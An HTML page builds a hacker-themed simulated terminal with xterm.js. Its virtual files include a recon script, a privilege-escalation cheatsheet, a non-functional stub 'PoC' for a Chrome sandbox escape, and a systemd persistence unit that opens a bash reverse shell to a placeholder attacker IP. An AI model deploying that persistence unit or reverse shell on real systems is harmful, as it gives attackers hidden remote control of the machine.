<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Lorel Axun</title>\n    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/xterm/css/xterm.min.css\" />\n    <style>\n        :root {\n            --bg: #1a1b26;\n            --fg: #a9b1d6;\n            --black: #32344a;\n            --red: #f7768e;\n            --green: #9ece6a;\n            --yellow: #e0af68;\n            --blue: #7aa2f7;\n            --magenta: #bb9af7;\n            --cyan: #7dcfff;\n            --white: #acb0d0;\n        }\n        body, html {\n            margin: 0;\n            padding: 0;\n            height: 100%;\n            background-color: var(--bg);\n            color: var(--fg);\n            font-family: 'Courier New', Courier, monospace;\n            overflow: hidden;\n        }\n        #terminal-container {\n            width: 100%;\n            height: 100%;\n            padding: 10px;\n            box-sizing: border-box;\n        }\n        #desktop {\n            display: none;\n            width: 100vw;\n            height: 100vh;\n            background-size: cover;\n            background-position: center;\n            position: relative;\n        }\n        #dock {\n            position: absolute;\n            bottom: 10px;\n            left: 50%;\n            transform: translateX(-50%);\n            background-color: rgba(44, 44, 59, 0.7);\n            padding: 8px;\n            border-radius: 12px;\n            display: flex;\n            gap: 10px;\n            border: 1px solid var(--black);\n        }\n        #terminal-icon {\n            width: 50px;\n            height: 50px;\n            background-color: var(--black);\n            color: var(--green);\n            display: flex;\n            align-items: center;\n            justify-content: center;\n            border-radius: 8px;\n            cursor: pointer;\n            font-size: 24px;\n            font-weight: bold;\n            transition: background-color 0.2s;\n        }\n        #terminal-icon:hover {\n            background-color: #414868;\n        }\n    </style>\n</head>\n<body>\n    <div id=\"terminal-container\"></div>\n    <div id=\"desktop\">\n        <div id=\"dock\">\n            <div id=\"terminal-icon\">&gt;_</div>\n        </div>\n    </div>\n    <div id=\"editor\"></div>\n\n    <script src=\"https://cdn.jsdelivr.net/npm/xterm/lib/xterm.min.js\"></script>\n    <script src=\"https://cdn.jsdelivr.net/npm/xterm-addon-fit/lib/xterm-addon-fit.min.js\"></script>\n    <script src=\"https://cdn.jsdelivr.net/npm/xterm-addon-attach/lib/xterm-addon-attach.min.js\"></script>\n    <script src=\"https://cdn.jsdelivr.net/npm/figlet/lib/figlet.js\"></script>\n\n    <script>\n        const term = new Terminal({\n            cursorBlink: true,\n            fontFamily: '\"Cascadia Code\", Menlo, Monaco, \"Courier New\", monospace',\n            fontSize: 14,\n            theme: {\n                background: 'var(--bg)',\n                foreground: 'var(--fg)',\n                cursor: 'var(--fg)',\n                black: 'var(--black)',\n                red: 'var(--red)',\n                green: 'var(--green)',\n                yellow: 'var(--yellow)',\n                blue: 'var(--blue)',\n                magenta: 'var(--magenta)',\n                cyan: 'var(--cyan)',\n                white: 'var(--white)',\n            }\n        });\n\n        const fitAddon = new FitAddon.FitAddon();\n        term.loadAddon(fitAddon);\n        term.open(document.getElementById('terminal-container'));\n        fitAddon.fit();\n        window.addEventListener('resize', () => fitAddon.fit());\n\n        let vfs = {\n            'recon.sh': '#!/bin/bash\\n# Basic reconnaissance script\\nTARGET=$1\\necho \"[+] Starting recon on $TARGET\"\\n\\n# Port scan\\nnmap -sV -T4 -A -v $TARGET\\n\\n# Subdomain enumeration\\nassetfinder --subs-only $TARGET\\n\\necho \"[+] Recon complete.\"',\n            'lorel.service': '[Unit]\\nDescription=Lorel Axun Persistence\\nAfter=network.target\\n\\n[Service]\\nExecStart=/bin/bash -c \\'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1\\'\\nRestart=always\\n\\n[Install]\\nWantedBy=multi-user.target',\n            'privesc_cheatsheet.txt': 'Linux Privilege Escalation\\n--------------------------\\n1. Kernel Exploits (dirty cow, etc.)\\n2. SUID/GUID binaries (find / -perm -u=s -type f 2>/dev/null)\\n3. Cron jobs (writable scripts?)\\n4. sudo -l (Can I run anything as root?)\\n5. NFS (no_root_squash)',\n            'cve-2025-4609.js': `// PoC for CVE-2025-4609: Chrome Mojo IPC Sandbox Escape\n// Target: Chrome < 136.0.7103.113 on Windows\n// This is a conceptual blueprint, not functional code.\n\nfunction craft_malicious_handle() {\n    // Create a handle that, when passed through Mojo IPC,\n    // will be misinterpreted by the browser process.\n    console.log('[*] Crafting a misaligned Mojo handle...');\n    // ... low-level memory manipulation would go here ...\n    return 'MALICIOUS_HANDLE';\n}\n\nfunction trigger_vulnerability(handle) {\n    // Use a legitimate Mojo interface to send the handle\n    // from the sandboxed renderer process to the browser process.\n    console.log('[*] Sending handle via vulnerable Mojo interface...');\n    // Mojo.getSomeInterface().doSomething(handle);\n    console.log('[!] Handle sent. The browser process should now be in a corrupted state.');\n}\n\nfunction execute_shellcode() {\n    // If the handle corruption leads to a use-after-free or type confusion,\n    // we can pivot to execute arbitrary code in the browser process context.\n    console.log('[+] State corrupted. Attempting to execute shellcode...');\n    // ... shellcode execution logic ...\n    console.log('[SUCCESS] Sandbox escaped. Gained RCE.');\n}\n\nfunction run() {\n    const handle = craft_malicious_handle();\n    trigger_vulnerability(handle);\n    execute_shellcode();\n}\n\nrun();`\n        };\n\n        let env = {\n            'USER': 'lorel',\n            'HOSTNAME': 'axun-vps',\n            'PWD': '~'\n        };\n\n        function saveState() {\n            localStorage.setItem('lorel_vfs', JSON.stringify(vfs));\n            localStorage.setItem('lorel_env', JSON.stringify(env));\n        }\n\n        function loadState() {\n            const savedVfs = localStorage.getItem('lorel_vfs');\n            const savedEnv = localStorage.getItem('lorel_env');\n            if (savedVfs) vfs = JSON.parse(savedVfs);\n            if (savedEnv) env = JSON.parse(savedEnv);\n        }\n\n        let commandHistory = [];\n        let historyIndex = -1;\n        let currentLine = \"\";\n\n        function prompt() {\n            term.write(`\\r\\n\\x1b[34m${env.USER}@${env.HOSTNAME}\\x1b[0m:\\x1b[32m${env.PWD}\\x1b[0m$ `);\n        }\n\n        const commands = {\n            help: () => {\n                term.writeln('\\nAvailable commands:');\n                term.writeln('  \\x1b[32mhelp\\x1b[0m          - Show this help message');\n                term.writeln('  \\x1b[32mexploit\\x1b[0m       - Run the CVE-2025-4609 simulation');\n                term.writeln('  \\x1b[32mstartx\\x1b[0m        - Switch to graphical desktop');\n                term.writeln('  \\x1b[32mshow_recon\\x1b[0m    - Display recon.sh');\n                term.writeln('  \\x1b[32mshow_service\\x1b[0m  - Display lorel.service');\n                term.writeln('  \\x1b[32mshow_privesc\\x1b[0m  - Display privesc_cheatsheet.txt');\n                term.writeln('  \\x1b[32mshow_exploit\\x1b[0m  - Display cve-2025-4609.js');\n                term.writeln('  \\x1b[32mclear\\x1b[0m         - Clear the terminal screen');\n            },\n            exploit: async () => {\n                const steps = [\n                    { text: '[+] Initializing CVE-2025-4609 exploit sequence...', time: 500 },\n                    { text: '[*] Target: Chrome Browser Process (Windows)', time: 1000 },\n                    { text: '[*] Vector: Mojo IPC Interface Handle Mismanagement', time: 1500 },\n                    { text: '[*] Crafting malicious Mojo handle in renderer process...', time: 2000 },\n                    { text: '[*] Sending handle to broker... triggering use-after-free.', time: 1500 },\n                    { text: '[!] Browser process memory corrupted.', time: 1000 },\n                    { text: '[+] Hijacking execution flow...', time: 2500 },\n                    { text: '\\x1b[32m[SUCCESS] Sandbox escape complete. Arbitrary code execution achieved.\\x1b[0m', time: 500 },\n                    { text: '[+] Spawning reverse shell...', time: 1000 }\n                ];\n                for (const step of steps) {\n                    await new Promise(res => setTimeout(res, step.time));\n                    term.writeln(step.text);\n                }\n            },\n            startx: () => {\n                document.getElementById('terminal-container').style.display = 'none';\n                const desktop = document.getElementById('desktop');\n                desktop.style.backgroundImage = `url('https://source.unsplash.com/random/1920x1080/?cyberpunk,matrix,hacker&t=${new Date().getTime()}')`;\n                desktop.style.display = 'block';\n            },\n            show_recon: () => term.writeln(`\\r\\n\\x1b[36m${vfs['recon.sh']}\\x1b[0m`),\n            show_service: () => term.writeln(`\\r\\n\\x1b[36m${vfs['lorel.service']}\\x1b[0m`),\n            show_privesc: () => term.writeln(`\\r\\n\\x1b[36m${vfs['privesc_cheatsheet.txt']}\\x1b[0m`),\n            show_exploit: () => term.writeln(`\\r\\n\\x1b[36m${vfs['cve-2025-4609.js']}\\x1b[0m`),\n            clear: () => term.clear(),\n        };\n\n        async function runCommand(command) {\n            if (command.trim() === '') return;\n            commandHistory.unshift(command);\n            historyIndex = -1;\n            term.writeln('');\n            const parts = command.trim().split(' ');\n            const cmd = parts[0];\n            if (commands[cmd]) {\n                await commands[cmd](...parts.slice(1));\n            } else {\n                term.writeln(`\\x1b[31mCommand not found: ${cmd}\\x1b[0m`);\n            }\n            saveState();\n        }\n\n        term.onKey(async (e) => {\n            const ev = e.domEvent;\n            const key = e.key;\n            if (ev.keyCode === 13) { // Enter\n                await runCommand(currentLine);\n                currentLine = \"\";\n                prompt();\n            } else if (ev.keyCode === 8) { // Backspace\n                if (currentLine.length > 0) {\n                    term.write('\\b \\b');\n                    currentLine = currentLine.slice(0, -1);\n                }\n            } else if (ev.keyCode === 38) { // Up arrow\n                if (historyIndex < commandHistory.length - 1) {\n                    historyIndex++;\n                    term.write(`\\x1b[2K\\r\\x1b[34m${env.USER}@${env.HOSTNAME}\\x1b[0m:\\x1b[32m${env.PWD}\\x1b[0m$ ${commandHistory[historyIndex]}`);\n                    currentLine = commandHistory[historyIndex];\n                }\n            } else if (ev.keyCode === 40) { // Down arrow\n                if (historyIndex > 0) {\n                    historyIndex--;\n                    term.write(`\\x1b[2K\\r\\x1b[34m${env.USER}@${env.HOSTNAME}\\x1b[0m:\\x1b[32m${env.PWD}\\x1b[0m$ ${commandHistory[historyIndex]}`);\n                    currentLine = commandHistory[historyIndex];\n                } else {\n                    historyIndex = -1;\n                    term.write(`\\x1b[2K\\r\\x1b[34m${env.USER}@${env.HOSTNAME}\\x1b[0m:\\x1b[32m${env.PWD}\\x1b[0m$ `);\n                    currentLine = \"\";\n                }\n            } else if (!ev.ctrlKey && !ev.altKey && !ev.metaKey) {\n                term.write(key);\n                currentLine += key;\n            }\n        });\n\n        document.getElementById('terminal-icon').addEventListener('click', () => {\n            document.getElementById('desktop').style.display = 'none';\n            document.getElementById('terminal-container').style.display = 'block';\n            term.focus();\n        });\n\n        function init() {\n            loadState();\n            figlet.parseFont('Standard', figlet.fonts.Standard);\n            figlet.text('Lorel Axun', {\n                font: 'Standard',\n            }, function(err, data) {\n                if (err) {\n                    console.log('Something went wrong...');\n                    console.dir(err);\n                    return;\n                }\n                term.writeln(data);\n                term.writeln('Welcome. Type \\'help\\' for a list of commands.');\n                prompt();\n            });\n            term.focus();\n        }\n\n        init();\n    </script>\n</body>\n</html>
